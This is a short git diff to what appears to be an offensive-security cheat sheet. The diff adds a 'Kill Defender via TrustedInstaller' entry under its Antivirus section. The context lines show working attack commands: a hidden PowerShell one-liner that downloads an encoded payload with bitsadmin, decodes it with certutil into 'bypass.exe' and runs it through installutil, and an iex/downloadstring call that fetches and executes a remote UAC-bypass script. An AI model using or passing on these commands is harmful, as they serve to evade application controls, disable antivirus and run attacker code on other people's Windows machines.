@@ -37,6 +37,7 @@ Enjoy.
 - [Antivirus](#antivirus)
     - [AMSI](#amsi)
         - [CLM](#clm)
+        - [Kill Defender](#Kill-Defender-via-TrustedInstaller)
         - [Java](#java)
         - [App Locker](#app-locker)
         - [Check PPL](#check-ppl)
@@ -247,7 +248,7 @@ $ExecutionContext.SessionState.LanguageMode
 powershell -windowstyle hidden bitsadmin /Transfer newjob3 http://192.168.49.173/enc3.txt c:\\windows\\temp\\enc3.txt;certutil -decode c:\\windows\\temp\\enc3.txt c:\\windows\\temp\\bypass.exe;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\windows\\temp\\bypass.exe
 ```
 
-##### Kill Defender
+##### Kill Defender via TrustedInstaller
 
 ```powershell
 iex(new-object net.webclient).downloadstring('http://172.21.23.10/uacbypass.ps1');alt
